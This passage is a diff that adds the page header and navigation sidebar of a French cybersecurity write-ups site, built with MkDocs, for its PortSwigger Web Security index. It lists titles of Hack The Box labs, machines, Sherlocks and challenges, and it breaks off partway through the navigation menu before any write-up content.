@@ -1,0 +1,2916 @@
+
+<!doctype html>
+<html lang="fr" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Writeups HTB - PortSwigger - pwn.college - CTF">
+      
+      
+        <meta name="author" content="CryptoGate">
+      
+      
+        <link rel="canonical" href="https://cryptogate-hub.github.io/cyber-writeups/web-security/portswigger/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Index - CryptoGate - Cyber Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#notes-portswigger-web-security-academy" class="md-skip">
+          Aller au contenu
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="En-tête">
+    <a href="../.." title="CryptoGate - Cyber Writeups" class="md-header__button md-logo" aria-label="CryptoGate - Cyber Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6 0 1.2.6 1.2 1.3v3.5c0 .6-.6 1.2-1.3 1.2H9.2c-.6 0-1.2-.6-1.2-1.3v-3.5c0-.6.6-1.2 1.2-1.2V9.5C9.2 8.1 10.6 7 12 7m0 1.2c-.8 0-1.5.5-1.5 1.3V11h3V9.5c0-.8-.7-1.3-1.5-1.3"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CryptoGate - Cyber Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Index
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Mode clair"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Mode clair" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Mode sombre"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Mode sombre" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Rechercher" placeholder="Rechercher" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Recherche">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Effacer" aria-label="Effacer" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initialisation de la recherche
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/CryptoGate-hub/cyber-writeups" title="Aller au dépôt" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    CryptoGate-hub/cyber-writeups
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Onglets" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../index/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Accueil
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../htb/index/" class="md-tabs__link">
+          
+  
+  
+  Hack The Box
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="index/" class="md-tabs__link">
+          
+  
+  
+  Web Security
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../linux-luminarium/index/" class="md-tabs__link">
+          
+  
+  
+  Linux et Systems
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../ctf/index/" class="md-tabs__link">
+          
+  
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="CryptoGate - Cyber Writeups" class="md-nav__button md-logo" aria-label="CryptoGate - Cyber Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6 0 1.2.6 1.2 1.3v3.5c0 .6-.6 1.2-1.3 1.2H9.2c-.6 0-1.2-.6-1.2-1.3v-3.5c0-.6.6-1.2 1.2-1.2V9.5C9.2 8.1 10.6 7 12 7m0 1.2c-.8 0-1.5.5-1.5 1.3V11h3V9.5c0-.8-.7-1.3-1.5-1.3"/></svg>
+
+    </a>
+    CryptoGate - Cyber Writeups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/CryptoGate-hub/cyber-writeups" title="Aller au dépôt" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    CryptoGate-hub/cyber-writeups
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Accueil
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hack The Box
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Hack The Box
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue d ensemble
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Starting Point
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Starting Point
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue d ensemble
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/01-meow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    01 Meow
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/02-fawn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    02 Fawn
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/03-dancing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    03 Dancing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/04-redeemer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    04 Redeemer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/05-appointment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    05 Appointment
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/06-sequel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    06 Sequel
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/07-oasis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    07 Oasis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/08-responder/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    08 Responder
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/09-three/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    09 Three
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/10-vaccine/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10 Vaccine
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/11-oopsie/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11 Oopsie
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/12-archetype/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12 Archetype
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/starting-point/labs/13-unified/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13 Unified
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Machines
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Machines
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/machines/index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue d ensemble
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/machines/cap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cap
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/machines/orion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Orion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/machines/nexus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nexus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/machines/reactor/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reactor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sherlocks DFIR
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Sherlocks DFIR
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/sherlocks/index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue d ensemble
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/sherlocks/brutus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Brutus
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/sherlocks/unit42/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unit42
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/sherlocks/campfire-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Campfire-1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/sherlocks/campfire-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Campfire-2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Challenges
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Challenges
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/challenges/index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vue d ensemble
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/challenges/first-contact/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    First Contact
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/challenges/flag-command/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Flag Command
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
